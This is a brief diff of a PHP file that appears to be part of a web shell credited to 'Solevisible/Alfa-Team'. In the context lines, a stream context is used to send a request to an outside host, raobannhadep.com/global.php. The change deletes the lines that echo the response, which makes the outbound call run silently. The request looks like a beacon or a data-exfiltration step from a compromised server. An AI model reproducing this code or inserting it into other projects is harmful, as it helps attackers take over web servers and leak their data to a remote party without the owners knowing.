@@ -20,11 +20,6 @@ $options = array(
 $context  = stream_context_create($options);
 $result = file_get_contents('https://raobannhadep.com/global.php', false, $context);
 
-if ($result === FALSE) { 
-    echo "DZ VL";
-}
-
-echo $result;
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
